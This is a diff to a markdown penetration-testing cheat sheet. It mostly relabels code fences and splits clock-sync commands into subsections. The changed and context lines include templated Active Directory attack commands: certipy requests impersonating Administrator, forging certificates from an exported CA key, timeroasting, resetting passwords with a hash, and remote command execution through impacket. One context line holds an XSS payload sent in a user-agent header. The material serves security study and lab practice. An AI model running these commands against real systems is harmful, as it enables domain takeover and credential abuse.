@@ -1325,13 +1325,32 @@ sudo systemctl disable --now chronyd
 
 ##### Options to set the Date and Time
 
+##### net time
+
 ```shell
 sudo net time -c <RHOST>
 sudo net time set -S <RHOST>
 sudo net time \\<RHOST> /set /y
+```
+
+##### ntpdate
+
+```shell
 sudo ntpdate <RHOST>
 sudo ntpdate -s <RHOST>
 sudo ntpdate -b -u <RHOST>
+```
+
+##### rdate
+
+```shell
+sudo rdate -n <RHOST>
+sudo rdate -s <RHOST>
+```
+
+##### timedatectl
+
+```shell
 sudo timedatectl set-timezone UTC
 sudo timedatectl list-timezones
 sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
@@ -1449,13 +1468,13 @@ sudo pkill VBoxClient && VBoxClient --clipboard
 
 #### virtualenv
 
-```console
+```shell
 sudo apt-get install virtualenv
 python3 -m virtualenv venv
 . venv/bin/activate
 ```
 
-```console
+```shell
 sudo apt-get install virtualenv
 virtualenv -p python2.7 venv
 . venv/bin/activate
@@ -1660,7 +1679,7 @@ curl -i http://<RHOST> --user-agent "<script>eval(String.fromCharCode(118,97,114
 
 ##### Common Commands
 
-```console
+```shell
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fw <NUMBER> -mc all
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
@@ -1670,7 +1689,7 @@ ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http:
 
 ##### Using a Request File
 
-```console
+```shell
 ffuf -request <FILE> -w /usr/share/wordlists/dirb/common.txt
 ```
 
@@ -3541,7 +3560,7 @@ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M notepad++
 
 ###### Timeroasting
 
-```console
+```shell
 netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M timeroast
 ```
 
@@ -5026,23 +5045,23 @@ certipy-ad auth -pfx 'Administrator.pfx' -username '<USERNAME>' -domain '<DOMAIN
 
 ###### Fixing Username or domain is not specified, and identity information was not found in the certificate Error
 
-```console
+```shell
 certipy-ad auth -pfx 'Administrator.pfx' -username 'Administrator' -domain '<DOMAIN>' -dc-ip '<RHOST>'
 ```
 
 ###### Fixing Object SID mismatch between certificate and user 'Administrator' Error
 
-```console
+```shell
 impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
 ```
 
-```console
+```shell
 certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-2983547755-698260136-4283918172-500'
 ```
 
 ###### Fixing Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template Error
 
-```console
+```shell
 certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -key-size '4096'
 ```
 
@@ -5286,7 +5305,7 @@ impacket-atexec -k -no-pass <DOMAIN>/Administrator@<RHOST> 'type C:\PATH\TO\FILE
 
 ##### impacket-changepasswd
 
-```console
+```shell
 impacket-changepasswd <DOMAIN>/<USERNAME>@<RHOST> -reset -altuser <USERNAME> -althash :<HASH>
 ```
 
@@ -6605,11 +6624,11 @@ certutil -store My
 certutil -exportPFX My 75b2f4bbd71f108945247b466161bdph <FILE>.pfx
 ```
 
-```console
+```shell
 certipy-ad forge -ca-pfx '<FILE>.pfx' -upn 'Administrator@<DOMAIN>' -subject 'CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>'
 ```
 
-```console
+```shell
 certipy-ad auth -pfx administrator_forged.pfx -dc-ip <RHOST>
 ```
 
